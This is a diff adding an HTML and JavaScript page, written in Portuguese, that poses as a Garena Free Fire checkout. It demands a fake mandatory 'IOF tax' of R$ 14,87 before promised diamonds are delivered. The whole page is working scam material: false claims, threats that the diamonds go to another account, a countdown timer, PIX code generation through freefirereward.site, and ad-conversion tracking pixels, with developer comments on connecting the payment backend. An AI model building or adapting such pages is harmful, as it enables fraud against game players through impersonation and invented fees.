@@ -1,0 +1,931 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Free Fire - Pagamento de Taxa</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+        window.pixelId = "68684b39105a6653cf6c4c58";
+        var a = document.createElement("script");
+        a.setAttribute("async", "");
+        a.setAttribute("defer", "");
+        a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+        document.head.appendChild(a);
+    </script>
+
+    <noscript><img
+        height="1"
+        width="1"
+        style="display: none"
+        src="https://www.facebook.com/tr?id=1626823594641442&ev=PageView&noscript=1"
+    /></noscript>
+    <noscript><img
+        height="1"
+        width="1"
+        style="display: none"
+        src="https://www.facebook.com/tr?id=1745537479323655&ev=PageView&noscript=1"
+    /></noscript>
+    <script src="js/latest.js" data-utmify-prevent-subids="" data-utmify-ignore-iframe="" async="" defer=""></script>
+
+    <script src="https://cdn.jsdelivr.net/npm/qrcode/build/qrcode.min.js"></script>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/uuid/8.3.2/uuid.min.js"></script>
+
+
+    <style>
+      @import url("https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap");
+
+      body {
+        font-family: "Roboto", sans-serif;
+        background-color: #f5f5f5;
+        color: #333;
+        margin: 0;
+        padding: 0;
+        overflow-x: hidden;
+        width: 100%;
+        position: relative;
+      }
+
+      html {
+        overflow-x: hidden;
+        width: 100%;
+      }
+
+      .container {
+        max-width: 800px;
+        margin: 0 auto;
+        background: white;
+        min-height: 100vh;
+      }
+
+      .header {
+        background: #f8f9fa;
+        padding: 10px 20px;
+        border-bottom: 1px solid #e9ecef;
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        flex-wrap: wrap;
+        gap: 10px;
+      }
+
+      .logo {
+        color: #dc3545;
+        font-weight: bold;
+        font-size: 18px;
+        max-width: 160px;
+        height: auto;
+      }
+
+      .user-icon {
+        width: 44px;
+        height: 44px;
+        border-radius: 50%;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        background: #dc3545;
+        box-shadow: 0 2px 8px rgba(220, 53, 69, 0.08);
+        transition: background 0.2s;
+      }
+
+      .user-icon svg {
+        display: block;
+        color: #fff;
+      }
+
+      @media (max-width: 600px) {
+        .header {
+          align-items: flex-start;
+          padding: 10px 8px;
+        }
+        .logo {
+          max-width: 120px;
+          font-size: 16px;
+        }
+        .user-icon {
+          width: 38px;
+          height: 38px;
+          margin-top: 8px;
+        }
+      }
+
+      .banner {
+        width: 100%;
+        height: 120px;
+        background: linear-gradient(135deg, #8b4513, #d2691e);
+        background-image: url("images/checkout-2-1024x161.jpg");
+        display: flex;
+        align-items: center;
+        color: white;
+        position: relative;
+        overflow: hidden;
+      }
+
+      .banner-content {
+        position: relative;
+        z-index: 1;
+        padding: 20px;
+      }
+
+      .attention-section {
+        text-align: center;
+        padding: 20px;
+      }
+
+      .attention-title {
+        color: #dc3545;
+        font-size: 24px;
+        font-weight: bold;
+        margin-bottom: 15px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 10px;
+      }
+
+      .progress-bar {
+        background: #dc3545;
+        color: white;
+        padding: 8px 15px;
+        border-radius: 20px;
+        font-size: 14px;
+        font-weight: bold;
+        margin-bottom: 20px;
+        display: inline-block;
+      }
+
+      .warning-text {
+        font-size: 18px;
+        line-height: 1.6;
+        color: #333;
+        margin-bottom: 30px;
+      }
+
+      .highlight {
+        font-weight: bold;
+      }
+
+      .warning-message {
+        background: #fff3cd;
+        border: 1px solid #ffeaa7;
+        border-radius: 8px;
+        padding: 20px;
+        margin: 20px;
+        text-align: center;
+        font-size: 18px;
+        font-weight: bold;
+        color: #333;
+      }
+
+      .pay-button {
+        background: #dc3545;
+        color: white;
+        border: none;
+        border-radius: 8px;
+        padding: 15px 30px;
+        font-size: 16px;
+        font-weight: bold;
+        cursor: pointer;
+        margin: 20px auto;
+        display: block;
+        transition: all 0.3s ease;
+      }
+
+      .pay-button:hover {
+        background: #c82333;
+        transform: translateY(-2px);
+      }
+
+      .tax-note {
+        text-align: center;
+        color: #6c757d;
+        font-style: italic;
+        margin: 20px;
+        font-size: 16px;
+      }
+
+      .pending-message {
+        text-align: center;
+        color: #6c757d;
+        margin: 30px 20px;
+        font-size: 14px;
+        line-height: 1.5;
+      }
+
+      .faq-section {
+        margin-top: 50px;
+        padding: 20px;
+      }
+
+      .faq-title {
+        color: #dc3545;
+        font-size: 20px;
+        font-weight: bold;
+        text-align: center;
+        margin-bottom: 30px;
+      }
+
+      .faq-item {
+        margin-bottom: 20px;
+      }
+
+      .faq-question {
+        color: #dc3545;
+        font-weight: bold;
+        margin-bottom: 10px;
+        cursor: pointer;
+        display: flex;
+        align-items: center;
+        gap: 10px;
+      }
+
+      .faq-answer {
+        color: #333;
+        line-height: 1.5;
+        padding-left: 20px;
+      }
+
+      .payment-interface {
+        display: none;
+        padding: 20px;
+      }
+
+      .price {
+        font-size: 32px;
+        font-weight: bold;
+        color: #374151;
+        text-align: center;
+        margin: 20px 0;
+      }
+
+      .pix-code-container {
+        background: #f9fafb;
+        border: 1px solid #e5e7eb;
+        border-radius: 8px;
+        padding: 12px;
+        margin: 20px 0;
+        font-family: monospace;
+        font-size: 14px;
+        color: #6b7280;
+        word-break: break-all;
+      }
+
+      .copy-button {
+        background: #3b82f6;
+        color: white;
+        border: none;
+        border-radius: 8px;
+        padding: 12px 20px;
+        margin: 10px 0;
+        width: 100%;
+        font-weight: 600;
+        cursor: pointer;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 8px;
+        transition: all 0.3s ease;
+      }
+
+      .copy-button:hover {
+        background: #2563eb;
+      }
+
+      .timer-section {
+        background: #f3f4f6;
+        padding: 15px 20px;
+        text-align: center;
+        color: #6b7280;
+        font-size: 14px;
+        border-radius: 8px;
+        margin: 20px 0;
+      }
+
+      .status-indicator {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 8px;
+        padding: 15px 20px;
+        color: #6b7280;
+        font-size: 14px;
+      }
+
+      .loading-dots {
+        display: inline-flex;
+        gap: 2px;
+      }
+
+      .loading-dots span {
+        width: 4px;
+        height: 4px;
+        background: #6b7280;
+        border-radius: 50%;
+        animation: loading 1.4s infinite ease-in-out;
+      }
+
+      .loading-dots span:nth-child(1) {
+        animation-delay: -0.32s;
+      }
+
+      .loading-dots span:nth-child(2) {
+        animation-delay: -0.16s;
+      }
+
+      @keyframes loading {
+        0%,
+        80%,
+        100% {
+          transform: scale(0);
+        }
+        40% {
+          transform: scale(1);
+        }
+      }
+
+      .instructions {
+        background: #f9fafb;
+        padding: 20px;
+        border-radius: 8px;
+        margin: 20px 0;
+      }
+
+      .instruction-item {
+        display: flex;
+        align-items: flex-start;
+        gap: 12px;
+        margin-bottom: 15px;
+        font-size: 14px;
+        color: #374151;
+      }
+
+      .instruction-number {
+        background: #374151;
+        color: white;
+        width: 20px;
+        height: 20px;
+        border-radius: 50%;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        font-size: 12px;
+        font-weight: bold;
+        flex-shrink: 0;
+      }
+
+      .verify-button {
+        background: #10b981;
+        color: white;
+        border: none;
+        border-radius: 8px;
+        padding: 15px 20px;
+        margin: 20px 0;
+        width: 100%;
+        font-weight: 600;
+        cursor: pointer;
+        font-size: 16px;
+        transition: all 0.3s ease;
+      }
+
+      .verify-button:hover {
+        background: #059669;
+      }
+
+      .notification-popup {
+        position: fixed;
+        top: 20px;
+        right: -300px;
+        background-color: #168821;
+        color: white;
+        padding: 16px;
+        border-radius: 8px;
+        box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+        z-index: 1000;
+        transition: right 0.3s ease-in-out;
+        display: flex;
+        align-items: center;
+        gap: 8px;
+      }
+
+      .notification-popup.show {
+        right: 20px;
+      }
+
+      .fade-in {
+        animation: fadeIn 0.5s ease-in;
+      }
+
+      @keyframes fadeIn {
+        from {
+          opacity: 0;
+        }
+        to {
+          opacity: 1;
+        }
+      }
+
+      .hidden {
+        display: none !important;
+      }
+
+      .progress-bar-animated {
+        margin-bottom: 20px;
+      }
+
+      .progress-bar-track {
+        background: #f3f4f6;
+        border-radius: 20px;
+        width: 100%;
+        height: 22px;
+        position: relative;
+        overflow: hidden;
+      }
+
+      .progress-bar-fill {
+        background: #dc3545;
+        height: 100%;
+        width: 0;
+        border-radius: 20px;
+        transition: width 1.2s cubic-bezier(0.4, 0, 0.2, 1);
+      }
+
+      .progress-bar-label {
+        position: absolute;
+        left: 50%;
+        top: 0;
+        transform: translateX(-50%);
+        color: white;
+        font-weight: bold;
+        font-size: 14px;
+        line-height: 22px;
+        z-index: 2;
+        pointer-events: none;
+      }
+      
+      #loadingPage {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background: rgba(255, 255, 255, 0.95);
+        z-index: 9999;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+      }
+
+      .loading-card {
+        background: white;
+        padding: 40px;
+        border-radius: 12px;
+        box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+        text-align: center;
+        max-width: 400px;
+        width: 90%;
+      }
+    </style>
+</head>
+<body>
+    <div id="notification" class="notification-popup">
+      <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path>
+      </svg>
+      <span>Código PIX copiado!</span>
+    </div>
+
+    <div id="loadingPage" class="hidden fade-in">
+      <div class="loading-card">
+        <h1 class="text-2xl font-bold mb-6 text-gray-800">
+          Gerando Guia de Pagamento
+        </h1>
+        <div class="flex justify-center items-center mb-4">
+          <div class="w-16 h-16 border-t-4 border-blue-600 border-solid rounded-full animate-spin"></div>
+        </div>
+        <p id="loadingMessage" class="text-lg text-gray-700">Aguarde...</p>
+      </div>
+    </div>
+
+    <div class="container">
+      <div class="header">
+        <img src="images/logo-garena.png" class="logo" alt="Logo Garena">
+        <div class="user-icon">
+          <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" width="28" height="28">
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M16 14a4 4 0 1 0-8 0m8 0a4 4 0 1 1-8 0m8 0v1a4 4 0 0 1-4 4H8a4 4 0 0 1-4-4v-1a8 8 0 1 1 16 0z"></path>
+          </svg>
+        </div>
+      </div>
+
+      <div class="banner" style="padding: 0; height: auto; background: none">
+        <img src="images/checkout-2-1024x161.jpg" alt="Banner Checkout" style="width: 100%; height: auto; display: block; max-width: 1024px; margin: 0 auto;">
+      </div>
+
+      <div id="mainContent">
+        <div class="attention-section">
+          <div class="attention-title">⚠️ ATENÇÃO!</div>
+
+          <div class="progress-bar-animated">
+            <div class="progress-bar-track">
+              <div class="progress-bar-fill" style="width: 98%;"></div>
+              <span style="color: white" class="progress-bar-label">Quase lá... 98%</span>
+            </div>
+          </div>
+
+          <div class="warning-text">
+            Seus diamantes estão garantidos
+            <span class="highlight">porém temos a taxa IOF sobre compras em jogos online, no valor de R$ 14,87</span>
+            para enviar os diamantes.
+          </div>
+        </div>
+
+        <div class="warning-message">
+          Caso não pague a taxa, os diamantes serão enviados a outra conta que está na fila de pedidos!
+        </div>
+
+        <button id="payButton" class="pay-button" onclick="showPaymentInterface()">PAGAR TAXA E RECEBER DIAMANTES</button>
+
+        <div class="tax-note">(Taxa Obrigatória)</div>
+
+        <div class="pending-message">
+          Agora está pendente o pagamento da taxa IOF sobre a compra, e só será possível receber os diamantes após o pagamento dessa taxa.
+        </div>
+
+        <div class="faq-section">
+          <div class="faq-title">Dúvidas Frequentes</div>
+
+          <div class="faq-item">
+            <div class="faq-question" onclick="toggleFaq(this)">▼ E se eu não pagar a taxa?</div>
+            <div class="faq-answer" style="display: none">O cliente tem até o final do dia após o suporte entrar em contato para pagar. Caso não consiga, perderá sua vaga (VAGA NÃO É REEMBOLSÁVEL)</div>
+          </div>
+
+          <div class="faq-item">
+            <div class="faq-question" onclick="toggleFaq(this)">▼ O que acontece após eu pagar?</div>
+            <div class="faq-answer" style="display: none">Após o pagamento, os diamantes serão enviados e você poderá continuar a usar o aplicativo normalmente.</div>
+          </div>
+        </div>
+      </div>
+
+      <div id="paymentInterface" class="payment-interface">
+        <h2 style="text-align: center; color: #dc3545; margin-bottom: 20px">Pagamento da Taxa IOF</h2>
+
+        <div id="valor-aprovado-completo" class="price">R$ 14,87</div>
+
+        <div class="pix-code-container">
+          <input id="codigo-input" type="text" readonly="" style="background: transparent; border: none; width: 100%; font-family: monospace; font-size: 14px; color: #6b7280; outline: none;" value="Carregando código PIX...">
+        </div>
+        <div id="qrCodeContainer" style="text-align: center; margin-top: 20px;">
+            <h3>Escaneie o QR Code para pagar</h3>
+            <canvas id="pixQrCode"></canvas> </div>
+
+        <button id="copiar-codigo" class="copy-button">
+          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+            <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
+            <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
+          </svg>
+          COPIAR CÓDIGO
+        </button>
+
+        <div class="timer-section">Faltam <strong id="timer">15:00</strong> minutos para o pagamento expirar...</div>
+
+        <div class="status-indicator">
+          <div class="loading-dots">
+            <span></span>
+            <span></span>
+            <span></span>
+          </div>
+          Aguardando pagamento
+        </div>
+
+        <div class="instructions">
+          <h3 style="margin: 0 0 20px 0; color: #374151; font-size: 18px; font-weight: 600;">Pagar seu pedido com PIX</h3>
+
+          <div class="instruction-item">
+            <div class="instruction-number">1</div>
+            <div>Copie o código acima.</div>
+          </div>
+
+          <div class="instruction-item">
+            <div class="instruction-number">2</div>
+            <div>Selecione a opção PIX Copia e Cola no aplicativo do seu banco.</div>
+          </div>
+
+          <div class="instruction-item">
+            <div class="instruction-number">3</div>
+            <div>Alguns segundos após o pagamento, a confirmação chega pra gente.</div>
+          </div>
+
+          <div class="instruction-item">
+            <div class="instruction-number">4</div>
+            <div>Recebedor: COMPRA SEGURA - Nossos parceiros nessa jornada.</div>
+          </div>
+        </div>
+
+        <button class="verify-button" onclick="manualVerifyPayment()">Verificar Pagamento</button>
+      </div>
+
+      <div id="pagamentoConfirmado" class="hidden" style="padding: 20px">
+        <div style="background: #10b981; color: white; padding: 20px; border-radius: 8px; text-align: center; margin-bottom: 20px;">
+          <h1 style="margin: 0; font-size: 24px; font-weight: bold">Pagamento Confirmado!</h1>
+        </div>
+        <div style="text-align: center">
+          <svg style="width: 80px; height: 80px; color: #10b981; margin: 20px auto" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path>
+          </svg>
+          <p style="font-size: 18px; font-weight: bold; margin: 20px 0">Seus diamantes serão enviados em breve</p>
+          <div style="background: #f3f4f6; padding: 20px; border-radius: 8px; margin: 20px 0;">
+            <div style="display: flex; justify-content: space-between; margin-bottom: 10px;">
+              <span>Valor:</span>
+              <span id="valor-detail" style="font-weight: bold">R$ 14,87</span>
+            </div>
+            <div style="display: flex; justify-content: space-between; margin-bottom: 10px;">
+              <span>Data:</span>
+              <span id="data-pagamento">00/00/0000</span>
+            </div>
+            <div style="display: flex; justify-content: space-between">
+              <span>Protocolo:</span>
+              <span id="protocolo-pagamento">FF-2023-1487</span>
+            </div>
+          </div>
+          <p style="color: #6b7280; font-size: 14px">Agradecemos por utilizar os serviços do Free Fire</p>
+        </div>
+      </div>
+    </div>
+
+    <script>
+      // ALTERAÇÃO: Importar uuidv4 do escopo global da biblioteca uuid
+      const uuidv4 = window.uuid.v4;
+
+      let paymentStarted = false;
+      let currentTransactionExternalId = null; // Para armazenar o external_id gerado
+
+      function showPaymentInterface() {
+        if (paymentStarted) return;
+
+        paymentStarted = true;
+        document.getElementById("mainContent").style.display = "none";
+        document.getElementById("paymentInterface").style.display = "block";
+
+        iniciarPagamento();
+      }
+
+      function toggleFaq(element) {
+        const answer = element.nextElementSibling;
+        const isVisible = answer.style.display !== "none";
+
+        document.querySelectorAll(".faq-answer").forEach((ans) => {
+          ans.style.display = "none";
+        });
+
+        document.querySelectorAll(".faq-question").forEach((q) => {
+          q.innerHTML = q.innerHTML.replace("▲", "▼");
+        });
+
+        if (!isVisible) {
+          answer.style.display = "block";
+          element.innerHTML = element.innerHTML.replace("▼", "▲");
+        }
+      }
+
+      document.addEventListener("DOMContentLoaded", function () {
+        setTimeout(function () {
+          const fill = document.querySelector(".progress-bar-fill");
+          if (fill) fill.style.width = "98%";
+        }, 300);
+
+        const loadingPage = document.getElementById("loadingPage");
+        const codigoInput = document.getElementById("codigo-input");
+        const copiarCodigo = document.getElementById("copiar-codigo");
+        const pagamentoConfirmado = document.getElementById("pagamentoConfirmado");
+        const valorAprovadoCompleto = document.getElementById("valor-aprovado-completo");
+        const valorDetailCompleto = document.getElementById("valor-detail");
+
+        const taxValue = "14,87";
+        valorAprovadoCompleto.textContent = "R$ " + taxValue;
+        valorDetailCompleto.textContent = "R$ " + taxValue;
+
+        localStorage.setItem("price", "1487"); // Valor em centavos
+        localStorage.setItem("priceReal", taxValue); // Valor formatado para exibição
+
+        const dataAtual = new Date();
+        const dataFormatada = dataAtual.toLocaleDateString("pt-BR");
+        document.getElementById("data-pagamento").textContent = dataFormatada;
+
+        // O protocolo deve ser o external_id da Buckpay para ser rastreável
+        // ALTERAÇÃO: O protocolo será o external_id da transação, gerado na função iniciarPagamento
+        // const protocolo = "FF-" + new Date().getFullYear() + "-" + Math.floor(Math.random() * 10000);
+        // document.getElementById("protocolo-pagamento").textContent = protocolo;
+
+        let tempoRestante = 15 * 60;
+        const timerElement = document.getElementById("timer");
+
+        function atualizarTimer() {
+          const minutos = Math.floor(tempoRestante / 60);
+          const segundos = tempoRestante % 60;
+          timerElement.textContent = `${minutos.toString().padStart(2, "0")}:${segundos.toString().padStart(2, "0")}`;
+
+          if (tempoRestante <= 0) {
+            clearInterval(timerInterval);
+            timerElement.textContent = "Expirado";
+          } else {
+            tempoRestante--;
+          }
+        }
+
+        const timerInterval = setInterval(atualizarTimer, 1000);
+        atualizarTimer();
+
+        async function verificarStatus() {
+          try {
+            console.log("[Verificação] Verificando status do pagamento...");
+            // ALTERAÇÃO: A URL para verificar o status deve ir para o seu backend,
+            // que por sua vez consultará a Buckpay com o external_id.
+            // Você precisará criar um novo endpoint no seu backend para GET /v1/transactions/external_id/:external_id
+            
+            // ATENÇÃO: SEU BACKEND PRECISA IMPLEMENTAR ESSE ENDPOINT DE VERIFICAÇÃO!
+            // URL de verificação apontando para seu site freefirereward.site
+            const response = await fetch(`https://freefirereward.site/status-pix/${currentTransactionExternalId}`);
+            const responseData = await response.json(); // Já espera JSON do seu backend
+            
+            console.log("[Verificação] Resposta do backend:", responseData);
+
+            // ALTERAÇÃO: A Buckpay retorna status como "pending" ou "paid"
+            if (responseData.success && responseData.status === "paid") {
+              console.log("[Verificação] Pagamento aprovado! Status:", responseData.status);
+
+              const priceInCents2 = parseInt(localStorage.getItem("price"), 10);
+
+              if (typeof fbq === "function") {
+                fbq("track", "Purchase", {
+                  value: priceInCents2,
+                  currency: "BRL",
+                  transaction_id: responseData.transaction_id, // Usar o ID da Buckpay
+                });
+              }
+
+              localStorage.removeItem("currentPayment");
+              console.log("[Verificação] Dados do pagamento removidos do localStorage");
+
+              document.getElementById("paymentInterface").style.display = "none";
+              document.getElementById("pagamentoConfirmado").classList.remove("hidden");
+
+              // ALTERAÇÃO: Atualiza o protocolo com o ID da transação da Buckpay
+              document.getElementById("protocolo-pagamento").textContent = responseData.transaction_id;
+
+              clearInterval(window.statusInterval);
+            } else {
+              console.log("[Verificação] Aguardando pagamento ou erro na resposta:", responseData.status);
+            }
+          } catch (error) {
+            console.error("[Verificação] Erro ao verificar status:", error);
+            // Considerar mostrar uma mensagem de erro na interface se a verificação falhar repetidamente
+          }
+        }
+
+        window.iniciarPagamento = async function () {
+          try {
+            console.log("[Pagamento] Iniciando processo de pagamento...");
+
+            // Mostrar loading
+            loadingPage.classList.remove("hidden");
+
+            // ALTERAÇÃO: Gerar um external_id único aqui no frontend
+            const generatedExternalId = uuidv4();
+            currentTransactionExternalId = generatedExternalId; // Armazena para futuras verificações
+            console.log("[Pagamento] External ID gerado:", generatedExternalId);
+
+            const urlParams = new URLSearchParams(window.location.search);
+            // Os dados de UTM e tracking serão passados para o backend e de lá para a Buckpay.
+            // Certifique-se que seu backend aceite e retransmita esses dados no campo 'tracking'.
+            const utmData = {
+              utm_source: urlParams.get("utm_source") || null, // null em vez de "" para campos não preenchidos
+              utm_medium: urlParams.get("utm_medium") || null,
+              utm_campaign: urlParams.get("utm_campaign") || null,
+              utm_content: urlParams.get("utm_content") || null,
+              utm_term: urlParams.get("utm_term") || null,
+              // ALTERAÇÃO: 'xcod' e 'sck' são nomes específicos que podem precisar ser mapeados para 'ref' e 'src' da Buckpay se não for usar a estrutura UTM completa.
+              // Para Buckpay, eles seriam parte de 'tracking.ref', 'tracking.src' etc.
+              ref: urlParams.get("xcod") || null,
+              sck: urlParams.get("sck") || null,
+            };
+
+            const priceInCents = parseInt(localStorage.getItem("price"), 10);
+            console.log("[Pagamento] Valor do pagamento em centavos:", priceInCents);
+
+            // ALTERAÇÃO: Dados de exemplo. Idealmente, o nome, email, cpf, telefone viriam de um formulário.
+            // Para Free Fire, talvez você tenha um ID de jogador ou um campo de email/telefone para identificar o usuário.
+            const formData = {
+              nome: "Cliente Teste", // Exemplo
+              email: "cliente.teste@example.com", // Exemplo
+              telefone: "5511987654321", // Exemplo, com 55 e DDD, sem formatação
+              cpf: "12345678901", // Exemplo, somente números
+              valor: priceInCents, // Já em centavos
+              external_id: generatedExternalId, // Passa o ID único para o backend
+              tracking: utmData // Passa os dados de tracking
+            };
+
+            // Enviar dados para o servidor
+            // ALTERAÇÃO CRÍTICA AQUI: Mudar localhost para o domínio do seu site
+            const response = await fetch("https://freefirereward.site/gerar-pix", {
+              method: "POST",
+              headers: {
+                "Content-Type": "application/json"
+              },
+              body: JSON.stringify(formData)
+            });
+
+            const responseData = await response.json();
+            console.log("[Pagamento] Resposta do servidor:", responseData);
+
+            if (responseData.success) {
+              console.log("[Pagamento] PIX gerado com sucesso pela Buckpay.");
+              // ALTERAÇÃO: paymentId agora é o ID da transação da Buckpay
+              window.paymentId = responseData.transaction_id; 
+
+              // Atualizar o código PIX na tela
+              const codigoInput = document.getElementById("codigo-input");
+              codigoInput.value = responseData.pixCode;
+
+              // Gerar o QR Code no canvas
+              // ALTERAÇÃO: qrcode_base64 pode ser usado, mas QRCode.toCanvas usa o pixCode diretamente.
+              // Você pode escolher exibir a imagem base64 diretamente (criando um <img> e setando src)
+              // ou gerar com QRCode.toCanvas. O seu HTML já tem um <canvas>, então vamos usá-lo.
+              QRCode.toCanvas(document.getElementById('pixQrCode'), responseData.pixCode, function (error) {
+                if (error) {
+                  console.error("Erro ao gerar o QR Code:", error);
+                  // Opcional: tentar carregar a imagem base64 como fallback
+                  // const imgElement = document.createElement('img');
+                  // imgElement.src = `data:image/png;base64,${responseData.qrcode_base64}`;
+                  // document.getElementById('qrCodeContainer').appendChild(imgElement);
+                } else {
+                  console.log("QR Code gerado com sucesso com QRCode.toCanvas!");
+                }
+              });
+
+              iniciarVerificacaoStatus();
+            } else {
+              console.error("[Pagamento] Erro ao gerar pagamento:", responseData.message, responseData.errorDetails);
+              alert(`Erro ao gerar PIX: ${responseData.message || 'Verifique o console para detalhes.'}`);
+            }
+
+          } catch (error) {
+            console.error("[Pagamento] Erro ao processar pagamento:", error);
+            alert("Ocorreu um erro ao processar seu pagamento. Tente novamente mais tarde.");
+          } finally {
+            loadingPage.classList.add("hidden");
+          }
+        };
+
+        function iniciarVerificacaoStatus() {
+          console.log("Iniciando verificação periódica do status...");
+          if (window.statusInterval) {
+            clearInterval(window.statusInterval);
+          }
+          // ALTERAÇÃO: Verificar a cada 7 segundos, conforme já está
+          window.statusInterval = setInterval(verificarStatus, 7000);
+        }
+
+        const feedbackCopia = (elemento) => {
+          const notification = document.getElementById("notification");
+          notification.classList.add("show");
+
+          setTimeout(() => {
+            notification.classList.remove("show");
+          }, 2000);
+        };
+
+        const copiarCodigoPix = async () => {
+          const codigoInput = document.getElementById("codigo-input");
+          try {
+            await navigator.clipboard.writeText(codigoInput.value);
+            console.log("[Pagamento] Código PIX copiado com sucesso");
+            feedbackCopia(document.querySelector("#copiar-codigo"));
+          } catch (err) {
+            console.error("[Pagamento] Erro ao copiar código:", err);
+            alert(
+              "Não foi possível copiar o código automaticamente. Por favor, copie manualmente."
+            );
+          }
+        };
+
+        document
+          .getElementById("copiar-codigo")
+          .addEventListener("click", copiarCodigoPix);
+      });
+
+      function manualVerifyPayment() {
+        // ALTERAÇÃO: Este botão agora chamará a função 'verificarStatus' novamente
+        const button = document.querySelector(".verify-button");
+        const originalText = button.textContent;
+        button.textContent = "Verificando...";
+        button.disabled = true;
+
+        verificarStatus().finally(() => { // Chama a função de verificação real
+            button.textContent = originalText;
+            button.disabled = false;
+        });
+      }
+    </script>
+</body>
+</html>
